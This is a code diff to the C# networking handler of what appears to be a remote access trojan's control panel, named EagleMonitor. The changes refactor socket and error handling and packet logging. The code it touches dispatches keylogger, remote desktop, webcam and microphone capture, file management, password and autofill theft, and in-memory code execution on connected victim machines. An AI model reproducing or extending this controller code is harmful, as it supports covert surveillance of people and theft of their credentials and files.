@@ -72,8 +72,12 @@ namespace EagleMonitor.Networking
         internal RemoteAudioForm remoteAudioForm { get; set; }
         internal RemoteChatForm chatForm { get; set; }
         internal RemoteCodeForm remoteCodeForm { get; set; }
+
+        internal Dictionary<string, DownloadFileForm> downloadForms;
+
         internal ClientHandler(Socket sock, int port) 
         {
+            downloadForms = new Dictionary<string, DownloadFileForm>();
             readDataAsync = new ReadDataAsync(ReceiveData);
             readPacketAsync = new ReadPacketAsync(PacketParser);
             sendDataAsync = new SendDataAsync(SendData);
@@ -86,18 +90,10 @@ namespace EagleMonitor.Networking
 
         internal void Receive()
         {
-            try
-            {
-                if (socket != null)
-                    readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
-                else
-                    return;
-            }
-            catch (Exception ex)
-            {
-                if (ex is SocketException)
-                    this.Dispose();
-            }
+            if (socket != null)
+                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
+            else
+                return;
         }
 
         private byte[] ReceiveData()
@@ -121,111 +117,86 @@ namespace EagleMonitor.Networking
                     total += recv;
                     dataleft -= recv;
                 }
-
                 return data;
             }
             catch (Exception ex)
             {
-                if (ex is SocketException)
+                SocketException sockError = ex as SocketException;
+                if (sockError != null)
                     this.Dispose();
-
                 return null;
             }
         }
         private void EndDataRead(IAsyncResult ar)
         {
-            try
-            {
-                byte[] data = readDataAsync.EndInvoke(ar);
+            byte[] data = readDataAsync.EndInvoke(ar);
 
-                if (data != null)//&& Connected)
-                    readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
+            if (data != null && data.Length > 0)
+                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);
 
-                if(socket != null)  
-                    Receive();
-            }
-            catch (Exception)
-            {
-                this.Dispose();
-            }
+            if (socket != null)
+                Receive();
         }
 
         
         private IPacket PacketParser(byte[] BufferPacket)
         {
-            try
-            {
-                return BufferPacket.DeserializePacket(Utils.Miscellaneous.settings.key);//, out packetSize);
-            }
-            catch (Exception ex)
-            {
-                if (ex is SocketException)
-                    this.Dispose();
-
-                return null;
-            }
+            return BufferPacket.DeserializePacket(Utils.Miscellaneous.settings.key);
         }
+
         private void EndPacketRead(IAsyncResult ar)
         {
-            try
-            {
-                IPacket packet = readPacketAsync.EndInvoke(ar);
+            IPacket packet = readPacketAsync.EndInvoke(ar);
 
-                if (packet != null)
+            if (packet != null)
+            {
+                switch (packet.packetType)
                 {
-                    switch (packet.packetType)
-                    {
 
-                        case PacketType.CONNECTED:
-                            ClientHandler.ClientHandlersList.Add(this.IP, this);
-                            new PacketHandler(packet, this);
-                            break;
+                    case PacketType.CONNECTED:
+                        ClientHandler.ClientHandlersList.Add(this.IP, this);
+                        new PacketHandler(packet, this);
+                        break;
 
-                        case PacketType.KEYLOG_ON:
-                            ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler = this;
-                            ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler.HWID = packet.HWID;
-                            new PacketHandler(packet, this);
-                            break;
+                    case PacketType.KEYLOG_ON:
+                        ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler = this;
+                        ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler.HWID = packet.HWID;
+                        new PacketHandler(packet, this);
+                        break;
 
-                        case PacketType.RM_VIEW_ON:
-                            ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler = this;
-                            ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler.HWID = packet.HWID;
-                            new PacketHandler(packet, this);
-                            break;
+                    case PacketType.RM_VIEW_ON:
+                        ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler = this;
+                        ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler.HWID = packet.HWID;
+                        new PacketHandler(packet, this);
+                        break;
 
-                        case PacketType.RC_CAPTURE_ON:
-                            ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler = this;
-                            ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler.HWID = packet.HWID;
-                            new PacketHandler(packet, this);
-                            break;
+                    case PacketType.RC_CAPTURE_ON:
+                        ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler = this;
+                        ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler.HWID = packet.HWID;
+                        new PacketHandler(packet, this);
+                        break;
 
-                        case PacketType.AUDIO_RECORD_ON:
-                            ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler = this;
-                            ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler.HWID = packet.HWID;
-                            new PacketHandler(packet, this);
-                            break;
+                    case PacketType.AUDIO_RECORD_ON:
+                        ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler = this;
+                        ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler.HWID = packet.HWID;
+                        new PacketHandler(packet, this);
+                        break;
 
-                        case PacketType.CHAT_ON:
-                            ClientHandler.ClientHandlersList[packet.baseIp].chatForm.clientHandler = this;
-                            ClientHandler.ClientHandlersList[packet.baseIp].chatForm.clientHandler.HWID = packet.HWID;
-                            new PacketHandler(packet, this);
-                            break;
+                    case PacketType.CHAT_ON:
+                        ClientHandler.ClientHandlersList[packet.baseIp].chatForm.clientHandler = this;
+                        ClientHandler.ClientHandlersList[packet.baseIp].chatForm.clientHandler.HWID = packet.HWID;
+                        new PacketHandler(packet, this);
+                        break;
 
-                        case PacketType.FM_DOWNLOAD_FILE:
-                            new PacketHandler(packet, this);
-                            break;
+                    case PacketType.FM_DOWNLOAD_FILE:
+                        new PacketHandler(packet, this);
+                        break;
 
-                        default:
-                            new PacketHandler(packet, ClientHandler.ClientHandlersList[packet.baseIp]);
-                            this.Dispose();
-                            break;
-                    }
+                    default:
+                        new PacketHandler(packet, ClientHandler.ClientHandlersList[packet.baseIp]);
+                        this.Dispose();
+                        break;
                 }
-            }
-            catch(Exception ex)
-            {
-                if(ex is SocketException)
-                    this.Dispose();
             }
         }
 
@@ -234,30 +205,33 @@ namespace EagleMonitor.Networking
         {
             packet.HWID = this.HWID;
             packet.baseIp = this.IP;
-            sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
+            if(socket != null)
+                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
         }
+
         private IPacket SendData(IPacket data)
         {
+            byte[] encryptedData = data.SerializePacket(Utils.Miscellaneous.settings.key);
+
+            int total = 0;
+            int size = encryptedData.Length;
+            int datalft = size;
+            byte[] header = new byte[5];
+
+            byte[] temp = BitConverter.GetBytes(size);
+
+            header[0] = temp[0];
+            header[1] = temp[1];
+            header[2] = temp[2];
+            header[3] = temp[3];
+            header[4] = (byte)data.packetType;
+
             try
             {
-                byte[] encryptedData = data.SerializePacket(Utils.Miscellaneous.settings.key);
-
-                int total = 0;
-                int size = encryptedData.Length;
-                int datalft = size;
-                byte[] header = new byte[5];
-                socket.Poll(-1, SelectMode.SelectWrite);
-
-                byte[] temp = BitConverter.GetBytes(size);
-
-                header[0] = temp[0];
-                header[1] = temp[1];
-                header[2] = temp[2];
-                header[3] = temp[3];
-                header[4] = (byte)data.packetType;
-
                 lock (socket)
                 {
+                    socket.Poll(-1, SelectMode.SelectWrite);
+
                     int sent = socket.Send(header);
 
                     if (size > 1000000)
@@ -282,73 +256,104 @@ namespace EagleMonitor.Networking
                             datalft -= sent;
                         }
                     }
-                    return data;
+                    data.packetState = PacketState.SENT;
                 }
             }
-            catch{ return null; }
+            catch (Exception ex)
+            {
+                data.packetState = PacketState.NOT_SENT;
+                data.status = ex.Message;
+                SocketException sockError = ex as SocketException;
+                if (sockError != null)
+                    this.Dispose();
+            }
+            return data;
         }
         private void SendDataCompleted(IAsyncResult ar)
         {
             IPacket packet = sendDataAsync.EndInvoke(ar);
 
-            if (packet != null)
+            packet.datePacketStatus = DateTime.Now.ToString();
+
+            IAsyncResult res = Program.mainForm.dataGridView2.BeginInvoke((MethodInvoker)(() =>
             {
-                packet.status = "SENT";
-                packet.datePacketStatus = DateTime.Now.ToString();
-            }
-            else
-            {
-                IAsyncResult res = Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
+                int rowId = Program.mainForm.dataGridView2.Rows.Add();
+                DataGridViewRow row = Program.mainForm.dataGridView2.Rows[rowId];
+                row.Cells["Column11"].Value = packet.HWID;
+                row.Cells["Column12"].Value = packet.baseIp;
+                row.Cells["Column13"].Value = packet.packetType.ToString();
+                row.Cells["Column14"].Style.ForeColor = Color.FromArgb(66, 182, 245);
+                row.Cells["Column14"].Value = packet.packetState;
+                row.Cells["Column15"].Value = packet.datePacketStatus;
+
+                if (packet.packetState == PacketState.NOT_SENT)
                 {
-                    try
+                    row.Cells["Column16"].Value = packet.status;
+                    return;
+                }
+
+                else
+                {
+                    switch (packet.packetType)
                     {
-                        int rowId = Program.logForm.dataGridView1.Rows.Add();
-                        DataGridViewRow row = Program.logForm.dataGridView1.Rows[rowId];
-                        row.Cells["Column1"].Value = packet.HWID;
-                        row.Cells["Column2"].Value = packet.baseIp;
-                        row.Cells["Column3"].Value = packet.packetType.ToString();
-                        row.Cells["Column4"].Style.ForeColor = Color.FromArgb(66, 182, 245);
-                        row.Cells["Column4"].Value = packet.status;
-                        row.Cells["Column6"].Value = packet.datePacketStatus;
+                        case PacketType.FM_DOWNLOAD_FILE:
+                            row.Cells["Column16"].Value = ((DownloadFilePacket)packet).fileName;
+                            break;
 
-                        switch (packet.packetType)
-                        {
-                            case PacketType.FM_DOWNLOAD_FILE:
-                                row.Cells["Column5"].Value = ((DownloadFilePacket)packet).fileName;
-                                break;
+                        case PacketType.FM_DELETE_FILE:
+                            row.Cells["Column16"].Value = ((DeleteFilePacket)packet).path;
+                            break;
 
-                            case PacketType.FM_DELETE_FILE:
-                                row.Cells["Column5"].Value = ((DeleteFilePacket)packet).path;
-                                break;
+                        case PacketType.FM_START_FILE:
+                            row.Cells["Column16"].Value = ((StartFilePacket)packet).filePath;
+                            break;
 
-                            case PacketType.FM_START_FILE:
-                                row.Cells["Column5"].Value = ((StartFilePacket)packet).filePath;
-                                break;
+                        case PacketType.FM_GET_FILES_AND_DIRS:
+                            row.Cells["Column16"].Value = ((FileManagerPacket)packet).path;
+                            break;
 
-                            case PacketType.FM_GET_FILES_AND_DIRS:
-                                row.Cells["Column5"].Value = ((FileManagerPacket)packet).path;
-                                break;
-                        }
+                        case PacketType.RM_VIEW_OFF:
+                            packet = null;
+                            this.Dispose();
+                            break;
+
+                        case PacketType.RC_CAPTURE_OFF:
+                            packet = null;
+                            this.Dispose();
+                            break;
+
+                        case PacketType.AUDIO_RECORD_OFF:
+                            packet = null;
+                            this.Dispose();
+                            break;
+
+                        case PacketType.CHAT_OFF:
+                            packet = null;
+                            this.Dispose();
+                            break;
+
+                        case PacketType.KEYLOG_OFF:
+                            packet = null;
+                            this.Dispose();
+                            break;
                     }
-                    catch {}
+                }
+                Program.mainForm.dataGridView2.ClearSelection();
+                Program.mainForm.dataGridView2.CurrentCell = null;
 
-                }));
-
-                Program.logForm.dataGridView1.EndInvoke(res);
-                packet = null;
-            }
+            }));
+            Program.mainForm.dataGridView2.EndInvoke(res);
         }
 
         public void Dispose()
         {
-            try
+            if (socket != null)
             {
                 socket.Shutdown(SocketShutdown.Both);
                 socket.Close();
                 socket.Dispose();
                 socket = null;
             }
-            catch { }
 
             if (ClientHandlersList.ContainsKey(this.IP))
                 ClientHandlersList.Remove(this.IP);
@@ -358,23 +363,31 @@ namespace EagleMonitor.Networking
                 Program.mainForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                 {
                     Program.mainForm.dataGridView1.Rows.Remove(this.clientRow);
+                    Utils.Miscellaneous.CloseForm(passwordsForm);
+                    Utils.Miscellaneous.CloseForm(fileManagerForm);
+                    Utils.Miscellaneous.CloseForm(processManagerForm);
+                    Utils.Miscellaneous.CloseForm(keyloggerForm);
+                    Utils.Miscellaneous.CloseForm(memoryExecutionForm);
+                    Utils.Miscellaneous.CloseForm(historyForm);
+                    Utils.Miscellaneous.CloseForm(miscellaneousForm);
+                    Utils.Miscellaneous.CloseForm(remoteDesktopForm);
+                    Utils.Miscellaneous.CloseForm(remoteCameraForm);
+                    Utils.Miscellaneous.CloseForm(informationForm);
+                    Utils.Miscellaneous.CloseForm(autofillForm);
+                    Utils.Miscellaneous.CloseForm(keywordsForm);
+                    Utils.Miscellaneous.CloseForm(remoteAudioForm);
+                    Utils.Miscellaneous.CloseForm(passwordsForm);
+                    Utils.Miscellaneous.CloseForm(chatForm);
+                    Utils.Miscellaneous.CloseForm(remoteCodeForm);
+
+                    foreach (KeyValuePair<string, DownloadFileForm> file in downloadForms) 
+                    {
+                        file.Value.clientHandler.Dispose();
+                        file.Value.Close();
+                    }
+                    downloadForms.Clear();
                 }));
 
-                Utils.Miscellaneous.CloseForm(passwordsForm);
-                Utils.Miscellaneous.CloseForm(fileManagerForm);
-                Utils.Miscellaneous.CloseForm(keyloggerForm);
-                Utils.Miscellaneous.CloseForm(processManagerForm);
-                Utils.Miscellaneous.CloseForm(memoryExecutionForm);
-                Utils.Miscellaneous.CloseForm(historyForm);
-                Utils.Miscellaneous.CloseForm(miscellaneousForm);
-                Utils.Miscellaneous.CloseForm(remoteCameraForm);
-                Utils.Miscellaneous.CloseForm(remoteDesktopForm);
-                Utils.Miscellaneous.CloseForm(informationForm);
-                Utils.Miscellaneous.CloseForm(remoteAudioForm);
-                Utils.Miscellaneous.CloseForm(chatForm);
-                Utils.Miscellaneous.CloseForm(autofillForm);
-                Utils.Miscellaneous.CloseForm(keyloggerForm);
-                Utils.Miscellaneous.CloseForm(remoteCodeForm);
             }
         }
     }
